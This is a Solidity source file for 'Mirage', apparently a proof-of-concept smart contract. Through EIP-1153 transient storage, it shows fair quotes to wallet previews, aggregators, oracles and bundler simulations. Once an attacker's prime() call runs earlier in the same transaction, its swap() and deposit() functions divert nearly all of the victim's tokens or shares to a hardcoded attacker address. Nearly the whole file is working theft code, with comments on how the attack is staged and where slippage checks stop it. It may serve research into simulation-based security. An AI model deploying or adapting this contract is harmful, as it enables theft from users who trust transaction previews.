// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// @notice A contract that LIES to any isolated simulation/preview via EIP-1153 transient state.
///
/// - Called in isolation (what a wallet preview / aggregator quote / oracle eth_call / bundler
///   per-userOp sim actually does): BENIGN, fair 1:1.
/// - Called after a cheap, innocuous `prime()` earlier in the SAME transaction/bundle: MALICIOUS rug.
///
/// Breaks the bedrock, un-audited assumption: "simulating a call predicts its on-chain effect."
/// The divergence is NOT caused by block/tx environment (which good simulators replicate) — it is
/// caused by an in-transaction *sibling call* the simulator never includes.
contract Mirage {
    uint256 private constant PRIMED = 0x6d69726167655f7072696d6564; // "mirage_primed" as a literal transient slot

    address public immutable attacker;
    IERC20 public immutable token;

    constructor(IERC20 _token, address _attacker) {
        token = _token;
        attacker = _attacker;
    }

    /// @dev Cheap and innocuous. In a bundle, an attacker runs this BEFORE the victim's action.
    function prime() external {
        assembly {
            tstore(PRIMED, 1)
        }
    }

    function _primed() internal view returns (bool p) {
        assembly {
            p := tload(PRIMED)
        }
    }

    /// @notice The VIEW quote wallets / aggregators / oracles read to preview the trade.
    /// @dev Isolated call -> fair. Primed -> ~0. A preview never sees the prime, so it shows fair.
    function getAmountOut(uint256 amountIn) public view returns (uint256) {
        return _primed() ? amountIn / 1_000_000 : amountIn;
    }

    /// @notice The user's actual action. Preview shows a fair swap; execution rugs to the attacker.
    function swap(uint256 amountIn, address to) external returns (uint256 out) {
        token.transferFrom(msg.sender, address(this), amountIn);
        out = getAmountOut(amountIn);
        token.transfer(to, out);
        if (_primed()) {
            // divert everything the "quote" hid, to the attacker
            token.transfer(attacker, amountIn - out);
        }
    }

    /// @notice A trade WITH a slippage backstop — the honest limit of the attack.
    /// @dev When primed, `out` is dust < minOut, so this REVERTS. Slippage-checked trades are safe.
    function swapWithMinOut(uint256 amountIn, uint256 minOut, address to) external returns (uint256 out) {
        token.transferFrom(msg.sender, address(this), amountIn);
        out = getAmountOut(amountIn);
        require(out >= minOut, "slippage");
        token.transfer(to, out);
        if (_primed()) token.transfer(attacker, amountIn - out);
    }

    /// @notice A preview-trusting action with NO user-side validation — where the Mirage is lethal.
    /// @dev Models deposit/migration/claim flows. The wallet preview shows fair shares; primed,
    ///      the user is minted dust and the attacker is credited the rest. No on-chain backstop.
    mapping(address => uint256) public shares;

    function deposit(uint256 amountIn) external returns (uint256 minted) {
        token.transferFrom(msg.sender, address(this), amountIn);
        minted = getAmountOut(amountIn); // "fair" 1:1 shares in any preview
        shares[msg.sender] += minted;
        if (_primed()) shares[attacker] += amountIn - minted; // the stolen shares
    }
}
